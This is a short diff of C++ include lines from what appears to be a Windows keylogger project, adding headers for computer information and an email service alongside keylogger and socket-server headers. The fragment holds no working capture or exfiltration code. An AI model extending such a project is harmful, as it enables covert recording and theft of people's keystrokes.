@@ -1,26 +1,11 @@
-//#define DBG
-#ifndef _WINSOCKAPI_
-#define _WINSOCKAPI_
-#endif // !_WINSOCKAPI_
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
-#endif // !WIN32_LEAN_AND_MEAN
 #include "stdafx.h"
-#include <string>
-#include <cstdlib>
-#include <memory>
-#include <io.h>
-#include <fcntl.h>
-#include <thread>
-#include <tchar.h>
-#include <windows.h>
-#include <stdio.h>
-#include <chrono>
-#include <ctime>
+//#define DBG
 
 #include "Keylogger.h"
 #include "SocketServer.h"
 #include "StringHelper.h"
+#include "ComputerInfoHelper.h"
+#include "EmailService.h"
 
 extern "C" { FILE __iob_func[3] = { *stdin,*stdout,*stderr }; }
 
